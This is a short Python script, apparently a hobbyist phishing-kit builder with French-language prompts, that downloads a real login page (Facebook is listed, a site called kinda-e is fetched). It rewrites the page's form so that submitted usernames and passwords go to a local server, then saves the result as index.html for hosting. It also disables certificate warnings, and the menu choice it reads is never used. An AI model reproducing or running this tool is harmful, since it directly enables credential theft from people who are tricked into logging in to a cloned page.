import requests
from bs4 import BeautifulSoup
import urllib3
import os 
from rich.console import Console

console = Console()



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#author : Jhonson

site=['https://m.facebook.com/login/?locale=fr_FR','https://kinda-e.com/securite/login.php']
decor = '[bold yellow]'
console.print(f'\n\n{decor}'+'[0]'+str('FACEBOOK')+'\n[1]Kinda-e\n\n')

try :
	
		url=int(console.input('[bold blue]Veuillez entrer ou saisir un chiffre correspondant a votre site phishing que vous voulez voir :'))
		r =requests.get(f'https://kinda-e.com/securite/login.php', verify=False)
		soup = BeautifulSoup(r.text, 'html.parser')
		modif = soup.select_one('form[action]')
		if modif:
		  modif['action']='http://0.0.0.0:8000'
		  change = str(soup.prettify())
		  file =open('index.html','w')
		  file.write(change)
		else :
		  form_tag = soup.find('form')
		  form_tag['action'] = 'http://0.0.0.0:8000'  
		  car = str(soup.prettify())
		  file=open('index.html', 'w')
		  file.write(car)
		 
		
		  	
		  
except :
	console.print ('[bold red] Entre uniquement un chiffre !')
